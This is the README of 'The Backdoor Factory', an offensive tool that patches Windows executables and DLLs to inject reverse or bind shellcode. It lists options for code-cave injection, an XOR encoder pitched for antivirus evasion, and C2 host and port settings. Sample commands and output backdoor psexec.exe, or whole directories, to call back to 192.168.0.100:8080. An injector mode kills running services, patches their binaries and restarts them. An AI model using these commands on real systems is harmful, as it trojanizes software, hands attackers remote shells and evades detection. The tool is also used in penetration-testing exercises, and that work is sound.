##The Backdoor Factory
Backdoors win32 PE files, to continue normal file execution (if the shellcode supports it), by patching the exe/dll directly.

Some executables have built in protections, as such this will not work on all PE files.  It is advisable that you test target PE files before deploying them to clients or using them in exercises.

Usage: ./backdoor.py -h

Usage: backdoor.py [options]

Options:
  -h, --help            show this help message and exit

  -f FILE, --file=FILE  File to backdoor
  
  -i HOST, --hostip=HOST
                        IP of the C2 for reverse connections
  
  -p PORT, --port=PORT  The port to either connect back to for reverse shells
                        or to listen on for bind shells
  
  -o OUTPUT, --output-file=OUTPUT
                        The backdoor output file
  
  -s SHELL, --shell=SHELL
                        Payloads that are available for use.
  
  -n NSECTION, --section=NSECTION
                        New section name must be less than seven characters
  
  -c, --cave            The cave flag will find code caves that can be used
                        for stashing shellcode.This will print to string all
                        the code caves of a specific size.The -l flag can be
                        use with this setting.
  
  -d DIR, --directory=DIR
                        This is the location of the files that you want to
                        backdoor.You can make a directory of file backdooring
                        faster by forcing the attaching of a codecave to the
                        exe by using the -a setting.
  
  -v, --verbose         For debug information output.
  
  -e ENCODER, --encoder=ENCODER
  
                        Encoders that can help with AV evasion.
  
  -l SHELL_LEN, --shell_length=SHELL_LEN
                        For use with -c to help find code caves of different
                        sizes
  
  -a, --add_new_section
                        Mandating that a new section be added to the exe
                        (better success) but less av avoidance
  
  -w, --change_access   This flag changes the section that houses the codecave
                        to RWE. Sometimes this is necessary. Enabled by
                        default. If disabled, the backdoor may fail.
  
  -j, --injector        This command turns the backdoor factory in a hunt and
                        shellcode inject type of mechinism. Edit the target
                        settings in the injector module.
  
  -u SUFFIX, --suffix=SUFFIX
                        For use with injector, places a suffix on the original
                        file for easy recovery


---
Features:

-After making a copy of the target file, the file copy will be patched directly.

-Finding all codecaves in an EXE/DLL.

-Injecting modified reverse/bind shells that allow continued execution after connection to the attacker.

-Modifying the PE/COFF header to add an additional section for all win32 executables/dlls, including those with an import table.

-Using the existing shellcode options, the ability to select PORT and HOST as connection options

-The ability to backdoor a directory of executables/dlls

-List all codecaves in the exe/dll

-Select the codecave in the exe/dll to backdoor, thereby not changing the filesize.

-Includes a simple XOR shellcode encoder.

---------------------------------------------
Sample Usage:

#Backdoor a exe/dll using an existing code cave:

./backdoor.py -f psexec.exe -i 192.168.0.100 -p 8080 -s reverse_shell_tcp -e xor_encode 

The following caves can be used to inject code and possibly continue execution
use a number greater than the highest reference to add a code cave to the executable/dll
versus using an existing code cave.. Good luck:

1 Section Name: .data; Section Begin: 0x2d200 End: 0x2f200; Cave begin: 0x2d2d5 End: 0x2d4d0; Cave Size: 507

2 Section Name: .data; Section Begin: 0x2d200 End: 0x2f200; Cave begin: 0x2d4e9 End: 0x2d6d5; Cave Size: 492

3 Section Name: .data; Section Begin: 0x2d200 End: 0x2f200; Cave begin: 0x2d6e3 End: 0x2d8d8; Cave Size: 501

4 Section Name: .data; Section Begin: 0x2d200 End: 0x2f200; Cave begin: 0x2d8f1 End: 0x2dadd; Cave Size: 492

5 Section Name: .data; Section Begin: 0x2d200 End: 0x2f200; Cave begin: 0x2dae7 End: 0x2dce0; Cave Size: 505

6 Section Name: .data; Section Begin: 0x2d200 End: 0x2f200; Cave begin: 0x2dcf3 End: 0x2dee5; Cave Size: 498

7 Section Name: .data; Section Begin: 0x2d200 End: 0x2f200; Cave begin: 0x2defb End: 0x2e0ea; Cave Size: 495

8 Section Name: .data; Section Begin: 0x2d200 End: 0x2f200; Cave begin: 0x2e161 End: 0x2e390; Cave Size: 559

9 Section Name: .rsrc; Section Begin: 0x2f200 End: 0x5bc00; Cave begin: 0x2f578 End: 0x2f708; Cave Size: 400

10 Section Name: .rsrc; Section Begin: 0x2f200 End: 0x5bc00; Cave begin: 0x58a39 End: 0x58c68; Cave Size: 559

Enter your selection: 2

Using selection: 2

psexec.exe backdooring complete

File bd.psexec.exe is in current directory


---

#Backdoor an exe/dll by adding a code section:

./backdoor.py -f psexec.exe -i 192.168.0.100 -p 8080 -s reverse_shell_tcp -a -e xor_encode

Adding a new section to the exe/dll for shellcode injection

psexec.exe backdooring complete

File bd.psexec.exe is in current directory

---
#Backdoor a directory of exes:
./backdoor.py -d test/ -i 192.168.0.100 -p 8080 -s reverse_shell_tcp -a


...output too long for README...

---
#Hunt and backdoor: Injector
The injector module will look for target executables to backdoor on disk.  It will check to see if you have identified the target as a service, check to see if the process is running, kill the process and/or service, inject the executable with the shellcode, save the original file to either file.exe.old or another suffix of choice, and attempt to restart the process or service.  
Edit the python dictionary "list_of_targets" in the 'injector' module for targets of your choosing.

./backdoor.py -j -i 192.168.0.100 -p 8080 -s reverse_shell_tcp -a -u .moocowwow 
